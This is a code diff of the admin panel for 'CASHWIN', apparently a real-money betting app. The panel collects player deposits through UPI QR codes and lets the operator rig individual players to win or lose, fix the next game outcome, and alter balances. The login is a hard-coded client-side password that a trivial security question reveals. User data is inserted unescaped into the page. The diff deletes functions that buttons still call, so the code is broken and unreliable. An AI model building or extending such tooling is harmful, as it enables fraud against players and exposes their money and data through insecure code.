@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CASHWIN - Master Control Center v10</title>
+    <title>CASHWIN - Master Control Center v11</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root { 
@@ -13,9 +13,10 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background: var(--bg); color: #f1f2f6; display: flex; height: 100vh; overflow: hidden; }
 
-        /* Login */
+        /* Login & Recovery */
         #loginOverlay { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; align-items: center; justify-content: center; }
         .login-card { background: #1e293b; padding: 40px; border-radius: 20px; width: 350px; text-align: center; border: 1px solid var(--accent); }
+        .recovery-link { font-size: 11px; color: #94a3b8; cursor: pointer; margin-top: 10px; display: block; }
 
         /* Sidebar */
         .sidebar { width: 260px; background: #1e293b; padding: 20px; border-right: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; }
@@ -23,42 +24,38 @@
         .nav-link { padding: 12px; color: #94a3b8; text-decoration: none; border-radius: 8px; margin-bottom: 8px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 10px; }
         .nav-link.active, .nav-link:hover { background: var(--accent); color: white; box-shadow: var(--glow); }
 
-        /* Content */
+        /* Sections */
         .main-content { flex: 1; overflow-y: auto; padding: 30px; }
         .section { display: none; }
         .section.active { display: block; animation: fadeIn 0.4s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Stats */
         .header-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 25px; }
         .stat-card { background: #1e293b; padding: 15px; border-radius: 12px; border-bottom: 3px solid var(--blue); }
 
-        /* Tables & Controls */
         .control-panel { background: #1e293b; padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.05); }
         table { width: 100%; border-collapse: collapse; background: #0f172a; border-radius: 10px; overflow: hidden; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 12px; }
         th { background: #334155; }
         
         .btn { padding: 6px 10px; border: none; border-radius: 4px; cursor: pointer; color: white; font-weight: bold; font-size: 10px; text-transform: uppercase; }
         .btn-green { background: var(--success); }
         .btn-red { background: var(--accent); }
         .btn-blue { background: var(--blue); }
-        .btn-dark { background: #475569; }
         .btn-orange { background: #f39c12; }
 
-        /* Chat */
-        #chatBox { position: fixed; bottom: 90px; right: 20px; width: 320px; height: 450px; background: #1e293b; border-radius: 15px; display: none; flex-direction: column; border: 1px solid var(--blue); z-index: 999; }
+        .qr-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 15px; }
+        .upload-slot { border: 2px dashed #334155; padding: 10px; text-align: center; border-radius: 10px; cursor: pointer; min-height: 100px; display: flex; align-items: center; justify-content: center; background-size: contain; background-repeat: no-repeat; background-position: center; }
+        .upload-slot img { max-width: 100%; max-height: 80px; object-fit: contain; }
+        .hidden-file { display: none; }
+
+        /* Chat Admin Box */
+        #chatBox { position: fixed; bottom: 20px; right: 20px; width: 320px; height: 450px; background: #1e293b; border-radius: 15px; display: none; flex-direction: column; border: 1px solid var(--blue); z-index: 999; }
         .chat-header { padding: 12px; background: var(--blue); border-radius: 15px 15px 0 0; font-weight: bold; display: flex; justify-content: space-between; }
         .chat-messages { flex: 1; overflow-y: auto; padding: 15px; font-size: 13px; display: flex; flex-direction: column; gap: 8px; }
         .msg { padding: 8px 12px; border-radius: 10px; max-width: 80%; }
         .msg-admin { background: var(--blue); align-self: flex-end; }
         .msg-user { background: #334155; align-self: flex-start; }
-        .chat-input { padding: 10px; border-top: 1px solid #334155; display: flex; gap: 5px; }
-
-        .qr-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 15px; }
-        .upload-slot { border: 2px dashed #334155; padding: 10px; text-align: center; border-radius: 10px; cursor: pointer; min-height: 100px; display: flex; align-items: center; justify-content: center; }
-        .upload-slot img { max-width: 100%; height: 80px; object-fit: contain; }
-        .hidden-file { display: none; }
     </style>
 </head>
 <body>
@@ -66,8 +63,11 @@
     <div id="loginOverlay">
         <div class="login-card">
             <h2 style="color:var(--accent); margin-bottom: 20px;">SYSTEM CONTROL</h2>
-            <input type="password" id="adminPass" style="width:100%; padding:12px; margin-bottom:20px; background:#0f172a; border:1px solid #334155; color:white;" placeholder="Secret Key">
-            <button class="btn btn-blue" style="width:100%; padding:12px;" onclick="checkLogin()">AUTHORIZE</button>
+            <div id="loginInputs">
+                <input type="password" id="adminPass" style="width:100%; padding:12px; margin-bottom:10px; background:#0f172a; border:1px solid #334155; color:white;" placeholder="Secret Key">
+                <button class="btn btn-blue" style="width:100%; padding:12px;" onclick="checkLogin()">AUTHORIZE</button>
+                <span class="recovery-link" onclick="forgotPass()">Forgot Password?</span>
+            </div>
         </div>
     </div>
 
@@ -107,7 +107,7 @@
                 <h2>User Management</h2>
                 <button class="btn btn-orange" onclick="globalUserReset()">Reset All User Rigs</button>
             </div>
-            <table><thead><tr><th>Phone</th><th>Balance</th><th>Rigging (W/L/R)</th><th>Status</th><th>Edit Bal</th><th>Action</th></tr></thead><tbody id="userTable"></tbody></table>
+            <table><thead><tr><th>Phone</th><th>Balance</th><th>Rigging</th><th>Status</th><th>Edit Bal</th><th>Action</th></tr></thead><tbody id="userTable"></tbody></table>
         </div>
 
         <div id="requests" class="section">
@@ -122,7 +122,7 @@
             <h3>Gateway QR Setup</h3>
             <div class="qr-grid">
                 <div class="control-panel">
-                    <h4>PhonePe</h4>
+                    <h4>PhonePe / Main</h4>
                     <div class="upload-slot" onclick="document.getElementById('qr1').click()" id="pre1">QR Upload</div>
                     <input type="file" id="qr1" class="hidden-file" onchange="handleImg(this, 'pre1')">
                     <input type="text" id="u1" placeholder="UPI ID" style="width:100%; margin-top:5px; background:#000; color:#fff; border:none; padding:5px;">
@@ -134,27 +134,28 @@
                     <input type="text" id="u2" placeholder="UPI ID" style="width:100%; margin-top:5px; background:#000; color:#fff; border:none; padding:5px;">
                 </div>
                 <div class="control-panel">
-                    <h4>GPay</h4>
+                    <h4>GPay / Merchant</h4>
                     <div class="upload-slot" onclick="document.getElementById('qr3').click()" id="pre3">QR Upload</div>
                     <input type="file" id="qr3" class="hidden-file" onchange="handleImg(this, 'pre3')">
                     <input type="text" id="u3" placeholder="UPI ID" style="width:100%; margin-top:5px; background:#000; color:#fff; border:none; padding:5px;">
                 </div>
             </div>
-            <h3>Home Banners (10)</h3>
+
+            <h3 style="margin-top:20px;">Home Banners (Scroll Images)</h3>
             <div id="bannerContainer" style="display:grid; grid-template-columns: repeat(2, 1fr); gap:10px;"></div>
-            <button class="btn btn-green" style="width:100%; padding:15px; margin-top:20px;" onclick="alert('Settings Pushed to App!')">SAVE & DEPLOY</button>
+            
+            <button class="btn btn-green" style="width:100%; padding:15px; margin-top:20px; font-size:14px;" onclick="deploySettings()">SAVE & DEPLOY EVERYTHING</button>
         </div>
     </div>
 
     <div id="chatBox">
         <div class="chat-header"><span id="chattingWith">Chat</span> <span onclick="toggleChat()" style="cursor:pointer">×</span></div>
         <div class="chat-messages" id="chatMsgs"></div>
-        <div class="chat-input">
-            <input type="text" id="msgInp" placeholder="Message..." style="flex:1; padding:8px; border-radius:5px; background:#0f172a; border:1px solid #334155; color:white;">
+        <div class="chat-input" style="padding:10px; display:flex; gap:5px;">
+            <input type="text" id="msgInp" style="flex:1; background:#0f172a; border:1px solid #334155; color:white; padding:5px;">
             <button class="btn btn-blue" onclick="sendMsg()">Send</button>
         </div>
     </div>
-    <div class="chat-float" style="position:fixed; bottom:20px; right:20px; width:50px; height:50px; background:var(--blue); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer;" onclick="toggleChat()"><i class="fas fa-comment"></i></div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
@@ -164,9 +165,20 @@
     const app = initializeApp(fbConfig);
     const db = getDatabase(app);
 
+    // Login & Forgot Password
     window.checkLogin = () => {
-        if(document.getElementById('adminPass').value === "admin123") document.getElementById('loginOverlay').style.display = 'none';
-        else alert("Access Denied!");
+        const pass = document.getElementById('adminPass').value;
+        if(pass === "admin123") document.getElementById('loginOverlay').style.display = 'none';
+        else alert("Wrong Password!");
+    };
+
+    window.forgotPass = () => {
+        const ans = prompt("What is your favorite color? (Security Question)");
+        if(ans && ans.toLowerCase() === "red") { // Change 'red' to your secret answer
+            alert("Password is: admin123");
+        } else {
+            alert("Wrong Answer!");
+        }
     };
 
     window.showSection = (id) => {
@@ -176,7 +188,7 @@
         event.currentTarget.classList.add('active');
     };
 
-    // User Table Logic
+    // Users Logic
     onValue(ref(db, 'users'), (snap) => {
         const body = document.getElementById('userTable'); body.innerHTML = "";
         let count = 0;
@@ -188,10 +200,9 @@
                 <td>
                     <button class="btn btn-green" onclick="uRig('${u.phone}','win')">W</button>
                     <button class="btn btn-red" onclick="uRig('${u.phone}','loss')">L</button>
-                    <button class="btn btn-orange" onclick="uRig('${u.phone}','normal')">R</button>
                 </td>
                 <td><button class="btn ${u.status==='banned'?'btn-red':'btn-green'}" onclick="toggleBan('${u.phone}','${u.status}')">${u.status||'active'}</button></td>
-                <td><input type="number" id="eb_${u.phone}" style="width:60px; background:#000; color:#fff; border:1px solid #334155;"></td>
+                <td><input type="number" id="eb_${u.phone}" style="width:50px; background:#000; color:#fff; border:1px solid #334155;"></td>
                 <td>
                     <button class="btn btn-blue" onclick="manualBal('${u.phone}')">Save</button>
                     <button class="btn btn-dark" onclick="startChat('${u.phone}')">Chat</button>
@@ -201,38 +212,33 @@
         document.getElementById('onlineCount').innerText = count;
     });
 
-    window.uRig = (ph, val) => update(ref(db, `users/${ph}`), { rig: val }).then(()=>alert("User Rigged to: "+val));
-    window.toggleBan = (ph, s) => update(ref(db, `users/${ph}`), { status: s === 'banned' ? 'active' : 'banned' });
-    window.manualBal = (ph) => {
-        const amt = parseFloat(document.getElementById('eb_'+ph).value);
-        if(!isNaN(amt)) update(ref(db, `users/${ph}`), { balance: increment(amt) }).then(()=>alert("Balance Updated!"));
-    };
-
-    // Requests System
+    // Request Handling (Reject with Refund Logic)
     window.loadRequests = (type) => {
         const head = document.getElementById('reqHead');
         const body = document.getElementById('reqBody');
         onValue(ref(db, `requests/${type}`), snap => {
             body.innerHTML = "";
             if(type === 'withdraws') {
-                head.innerHTML = "<th>Phone</th><th>Amount</th><th>Details</th><th>Action</th>";
+                head.innerHTML = "<th>Phone</th><th>Amount</th><th>UPI/Bank</th><th>Action</th>";
                 snap.forEach(r => {
                     const d = r.val();
-                    if(d.status==='pending') body.innerHTML += `<tr><td>${d.phone}</td><td>₹${d.amount}</td><td>${d.upi||d.bank}</td>
-                    <td>
-                        <button class="btn btn-green" onclick="handleReq('${type}','${r.key}','paid')">Paid</button>
-                        <button class="btn btn-red" onclick="handleReq('${type}','${r.key}','rejected','${d.phone}',${d.amount})">Reject & Refund</button>
-                    </td></tr>`;
+                    if(d.status==='pending') body.innerHTML += `<tr>
+                        <td>${d.phone}</td><td>₹${d.amount}</td><td>${d.upi||d.bank}</td>
+                        <td>
+                            <button class="btn btn-green" onclick="handleReq('withdraws','${r.key}','paid')">Approve</button>
+                            <button class="btn btn-red" onclick="handleReq('withdraws','${r.key}','rejected','${d.phone}',${d.amount})">Reject & Refund</button>
+                        </td></tr>`;
                 });
             } else {
                 head.innerHTML = "<th>Phone</th><th>Amount</th><th>UTR</th><th>Action</th>";
                 snap.forEach(r => {
                     const d = r.val();
-                    if(d.status==='pending') body.innerHTML += `<tr><td>${d.phone}</td><td>₹${d.amount}</td><td>${d.utr}</td>
-                    <td>
-                        <button class="btn btn-green" onclick="handleReq('${type}','${r.key}','success','${d.phone}',${d.amount})">Approve</button>
-                        <button class="btn btn-red" onclick="handleReq('${type}','${r.key}','rejected')">Reject</button>
-                    </td></tr>`;
+                    if(d.status==='pending') body.innerHTML += `<tr>
+                        <td>${d.phone}</td><td>₹${d.amount}</td><td style="color:var(--blue)">${d.utr||'N/A'}</td>
+                        <td>
+                            <button class="btn btn-green" onclick="handleReq('deposits','${r.key}','success','${d.phone}',${d.amount})">Approve</button>
+                            <button class="btn btn-red" onclick="handleReq('deposits','${r.key}','rejected')">Reject</button>
+                        </td></tr>`;
                 });
             }
         });
@@ -240,41 +246,83 @@
 
     window.handleReq = (type, key, stat, ph, amt) => {
         update(ref(db, `requests/${type}/${key}`), { status: stat });
-        if(stat === 'success' || (type === 'withdraws' && stat === 'rejected')) {
+        // Deposit Approve -> Add Bal
+        if(type === 'deposits' && stat === 'success') {
             update(ref(db, `users/${ph}`), { balance: increment(amt) });
         }
-        alert("Request " + stat);
+        // Withdraw Reject -> Refund Bal
+        if(type === 'withdraws' && stat === 'rejected') {
+            update(ref(db, `users/${ph}`), { balance: increment(amt) });
+            alert("Withdraw Rejected & Amount Refunded to User!");
+        } else {
+            alert("Request " + stat);
+        }
     };
 
-    // Chat
+    // Banners & Deployment Fix
+    const bCont = document.getElementById('bannerContainer');
+    for(let i=1; i<=6; i++) {
+        bCont.innerHTML += `
+        <div class="control-panel" style="padding:10px;">
+            <div class="upload-slot" onclick="document.getElementById('bf${i}').click()" id="pb${i}">Banner ${i}</div>
+            <input type="file" id="bf${i}" class="hidden-file" onchange="handleImg(this,'pb${i}')">
+            <input type="text" id="bl${i}" placeholder="Redirect URL" style="width:100%; background:#000; color:#fff; border:none; font-size:10px; margin-top:5px; padding:3px;">
+        </div>`;
+    }
+
+    window.handleImg = (input, preId) => {
+        const file = input.files[0];
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            document.getElementById(preId).innerHTML = `<img src="${e.target.result}">`;
+        };
+        reader.readAsDataURL(file);
+    };
+
+    window.deploySettings = () => {
+        const paymentData = {
+            upi: document.getElementById('u1').value,
+            qr: document.getElementById('pre1').querySelector('img')?.src || "",
+            paytm_upi: document.getElementById('u2').value,
+            paytm_qr: document.getElementById('pre2').querySelector('img')?.src || "",
+            merchant_upi: document.getElementById('u3').value,
+            merchant_qr: document.getElementById('pre3').querySelector('img')?.src || ""
+        };
+
+        let bannerData = [];
+        for(let i=1; i<=6; i++){
+            const img = document.getElementById(`pb${i}`).querySelector('img')?.src;
+            if(img) bannerData.push({ image: img, link: document.getElementById(`bl${i}`).value || "#" });
+        }
+
+        update(ref(db, 'admin/settings'), {
+            payment: paymentData,
+            banners: bannerData
+        }).then(() => alert("All Settings & Banners Deployed Successfully!"));
+    };
+
+    // Chat Logic (Admin Only Panel)
     let activeChat = "";
-    window.toggleChat = () => { const c = document.getElementById('chatBox'); c.style.display = c.style.display==='flex'?'none':'flex'; };
     window.startChat = (ph) => {
-        activeChat = ph; document.getElementById('chattingWith').innerText = ph; toggleChat();
+        activeChat = ph; document.getElementById('chattingWith').innerText = ph;
+        document.getElementById('chatBox').style.display = 'flex';
         onValue(ref(db, `chats/${ph}`), snap => {
             const m = document.getElementById('chatMsgs'); m.innerHTML = "";
-            snap.forEach(c => { const d = c.val(); m.innerHTML += `<div class="msg ${d.sender==='admin'?'msg-admin':'msg-user'}">${d.text}</div>`; });
+            snap.forEach(c => {
+                const d = c.val();
+                m.innerHTML += `<div class="msg ${d.sender==='admin'?'msg-admin':'msg-user'}">${d.text}</div>`;
+            });
             m.scrollTop = m.scrollHeight;
         });
     };
     window.sendMsg = () => {
         const t = document.getElementById('msgInp').value;
-        if(t && activeChat) { push(ref(db, `chats/${activeChat}`), { sender: 'admin', text: t, time: Date.now() }); document.getElementById('msgInp').value = ""; }
+        if(t && activeChat) {
+            push(ref(db, `chats/${activeChat}`), { sender: 'admin', text: t, time: Date.now() });
+            document.getElementById('msgInp').value = "";
+        }
     };
-
-    // Banner & Rig
-    window.handleImg = (input, preId) => {
-        const file = input.files[0]; const reader = new FileReader();
-        reader.onload = (e) => { document.getElementById(preId).innerHTML = `<img src="${e.target.result}">`; };
-        reader.readAsDataURL(file);
-    };
-    const bCont = document.getElementById('bannerContainer');
-    for(let i=1; i<=10; i++) {
-        bCont.innerHTML += `<div class="control-panel" style="padding:10px;"><div class="upload-slot" onclick="document.getElementById('bf${i}').click()" id="pb${i}">Banner ${i}</div><input type="file" id="bf${i}" class="hidden-file" onchange="handleImg(this,'pb${i}')"><input type="text" placeholder="URL" style="width:100%; background:#000; color:#fff; border:none; font-size:10px; margin-top:5px;"></div>`;
-    }
-
-    window.rigGame = (v) => set(ref(db, 'admin_settings/wingo_next'), v).then(() => alert("Wingo Rigged: " + v));
-    window.globalUserReset = () => alert("All user rigging has been reset to normal.");
+    window.toggleChat = () => document.getElementById('chatBox').style.display = 'none';
 
 </script>
 </body>
